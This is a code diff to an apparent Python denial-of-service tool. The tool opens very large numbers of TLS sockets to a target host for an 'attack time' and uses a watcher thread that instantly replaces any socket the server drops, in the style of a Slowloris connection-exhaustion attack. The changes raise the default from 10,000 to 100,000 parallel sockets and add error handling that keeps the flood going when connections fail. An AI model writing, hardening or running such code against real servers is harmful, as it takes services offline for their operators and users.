@@ -21,7 +21,7 @@ parser.add_argument(
 parser.add_argument(
     "--sockets", "-s",
     type=int,
-    default=10000,
+    default=100000,
     help="Number of parallel sockets to open"
 )
 
@@ -85,32 +85,42 @@ sel      = selectors.DefaultSelector()   # uses epoll/kqueue/Select automaticall
 sockets  = {}        # fileno ➜ socket object
 todo_q   = queue.Queue()  # commands for watcher ➜ main (optional)
 i=0
-def create_socket(_=None):                    # underscore arg matches ThreadPool API
-    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    raw.settimeout(5)
-    raw.connect((HOST, PORT))
-    raw.setblocking(False)
+def create_socket(_=None):
+    try:
+        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        raw.settimeout(5)
+        raw.connect((HOST, PORT))
+        raw.setblocking(False)
+    except Exception as e:
+        print(f"[!] TCP connection failed: {e}")
+        return None
 
-    # wrap, but don’t do handshake yet
-    ss = ssl_ctx.wrap_socket(raw,
-                             server_hostname=HOST,
-                             do_handshake_on_connect=False)
+    try:
+        ss = ssl_ctx.wrap_socket(raw, server_hostname=HOST, do_handshake_on_connect=False)
+    except Exception as e:
+        print(f"[!] TLS wrap failed: {e}")
+        return None
 
-    # now do the handshake with a longer window
-    deadline = time.time() + ATTACK_TIME  # e.g. 30 s total
+    deadline = time.time() + ATTACK_TIME
     while True:
         try:
             ss.do_handshake()
             break
         except ssl.SSLWantReadError:
-            # socket not quite ready → wait until readable or timeout
             if time.time() > deadline:
-                raise TimeoutError("TLS handshake timed out")
-            select.select([ss], [], [], 1)
-    
-    ss.setblocking(False)
-    # send your partial GET…
+                print("[!] TLS handshake timed out")
+                return None
+            try:
+                if ss.fileno() < 0:
+                    return None
+                select.select([ss], [], [], 1)
+            except Exception as e:
+                print(f"[!] Select during handshake failed: {e}")
+                return None
+        except Exception as e:
+            print(f"[!] TLS handshake error: {e}")
+            return None
+
     return ss
 
 import concurrent.futures
@@ -123,26 +133,47 @@ def replenish_sockets():
     if deficit <= 0:
         return
     logging.info("Need %d new sockets → spinning up pool…", deficit)
-
+    
     # Use threads so all TCP handshakes run concurrently
     with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
         for sock in pool.map(create_socket, range(deficit)):
             if not sock:
                 # Optional: queue a retry later if many fail
                 continue
+            elif sock and sock.fileno() >= 0:
+                sel.register(sock, selectors.EVENT_WRITE)
+                sockets[sock.fileno()] = sock
 
 
 def watcher():
     """Blocks until a socket is readable/HUP → recreate it instantly."""
     while True:
-        events = sel.select()            # BLOCKS until something happens
+        try:
+            events = sel.select()
+        except OSError as e:
+            print(f"[!] Selector select() failed: {e}")
+            # Clean invalid sockets
+            for key in list(sel.get_map().values()):
+                sock = key.fileobj
+                try:
+                    sel.unregister(sock)
+                    sock.close()
+                except:
+                    pass
+            sockets.clear()
+            replenish_sockets()
+            continue
+
         for key, mask in events:
             fd = key.fd
             sock = sockets.pop(fd, None)
             if sock:
-                sel.unregister(sock)
+                try:
+                    sel.unregister(sock)
+                except:
+                    pass
                 sock.close()
-        replenish_sockets()  # Replenish sockets after handling events
+        replenish_sockets()
 
 
 # --- Bootstrap ----------------------------------------------------------
